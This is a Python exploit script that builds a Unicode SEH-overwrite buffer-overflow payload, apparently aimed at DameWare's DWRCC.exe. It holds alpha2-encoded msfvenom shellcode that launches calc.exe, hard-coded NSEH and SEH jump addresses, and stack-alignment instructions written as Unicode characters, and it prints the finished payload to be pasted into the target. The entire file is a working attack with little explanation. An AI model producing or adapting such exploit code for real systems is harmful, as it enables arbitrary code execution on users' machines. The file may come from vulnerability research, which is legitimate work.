#!/usr/bin/env python

# Maximum length
maxlen = 5000

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -f raw -o calc.bin
# alpha2 eax --unicode < calc.bin
shellcode = (
"PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JBkLjHu29pIpipQPQygumaEpPdbknpNP4KObjlTKObLTrkQbo8lOx7njO6nQ9otlOLqQallBllKpGQXOZmiqY79RXrnrpWrknrZpdKmzoLrkNln1sHZCOXJaVqNqDKnyKpM1j3RkQ9zxK3OJmyRkLtRkJaGfNQyodli1XOlMzaXGlxgpPuhvKSsMkHoKsMmTbUyTNxTKR8O4iqwcovRkZl0KTKPXMLiq8SRkkTdKm1xP3YOTmTKt1KQKQQaI0ZpQkOk0qOQOPZ4KLRxk4MOmozJatMauDrKP9p9pb0S801RkrOU7KOweEkjP85uRQFOxTfV57MuMkOYEOLJfSLYzQpkKYPbUM5ekngn30rrOaZkPnsioZ5aSoq2LRCLn0eQhqU9pA"
)

# Crashes
crash_nseh = 1672
crash_seh = crash_nseh + 2

# Padding
padd = "\x41" * 31

# Align ESP
align_esp = "\x58\x73" * 6                                      # POP EAX # VENNOP      # EAX --> 0x0012b9fc	# Goes down the stack for a suitable address to put in EAX
align_esp += u'\u422c'                                          # SUB AL, 0x42          # EAX --> 0x0012b9ba	# UNICODE instruction: 2 opcodes per line
align_esp += u'\uc488'                                          # MOV AH, AL            # EAX --> 0x0012baba	# UNICODE instruction: 2 opcodes per line
align_esp += u'\u422c'                                          # SUB AL, 0x42          # EAX --> 0x0012ba78	# UNICODE instruction: 2 opcodes per line
align_esp += "\x50\x73"                                         # PUSH EAX # VENNOP	# Put modified value on stack
align_esp += "\x5c\x73"                                         # POP ESP # VENNOP	# Put value just being put on stack, in ESP
align_esp += "\x73\x73" * 4                                     # VENNOP		# Some NOP'ing in a Venetian method

# Variables
prefix = "A" * crash_nseh                                       # Filler until NSEH/SEH
nseh = u'\ueb16' + "\x43"                                       # JMP SHORT 		# Unicodes translates to 0x004316eb
seh = u'\u9d7d' + "\x43"                                        # POP POP RET 		# DWRCC.exe # Unicodes translates to 0x00437d9d
suffix = padd                                                   # Padd correctly after jump
suffix += align_esp                                             # Align ESP via UNICODE character instructions
suffix += shellcode                                             # Alpha2 encoded unicode shellcode
suffix += "D" * (maxlen - len(prefix + nseh + seh + suffix))    # Filler

# Payload
payload = prefix + nseh + seh + suffix                          # Construct payload

# Print it to copy/paste
print payload

